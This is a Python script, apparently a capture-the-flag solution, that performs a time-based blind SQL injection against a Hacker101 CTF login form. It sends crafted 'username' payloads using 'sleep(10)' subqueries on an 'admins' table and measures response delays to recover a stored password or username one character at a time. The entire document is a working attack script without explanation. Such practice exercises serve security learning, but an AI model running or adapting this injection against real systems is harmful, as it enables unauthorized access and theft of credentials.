import requests
import string

url = "https://4ba8651c6b7584c563d4bc974949eca8.ctf.hacker101.com/login"
headers = {'content-type': 'application/x-www-form-urlencoded'}
filtered_chars = ''
secret = ''
possible_letters = string.ascii_uppercase + string.ascii_lowercase + string.digits
custom_pw = "asdf"
# brute_force = "username"
brute_force = "password"

for c in possible_letters:
    payload = f"username=' or (select sleep(10) from admins where {brute_force} like binary '%{c}%');--&password={custom_pw}"
    r = requests.post(url, data=payload, headers=headers)
    if (r.elapsed.seconds >= 10):
        filtered_chars = filtered_chars + c
        print("[*] New char detected in secret: " + c)

finished = False
while not finished:
    for char in filtered_chars:
        payload = f"username=' or (select sleep(10) from admins where {brute_force} like binary '{secret + char}%');--&password={custom_pw}"
        r = requests.post(url, data=payload, headers=headers)
        if (r.elapsed.seconds >= 10):
            secret = secret + char
            print("[*] Building secret...: " + secret)
            break
        elif (r.elapsed.seconds < 10 and char == filtered_chars[-1]):
            finished = True
print("Found secret: ", secret)
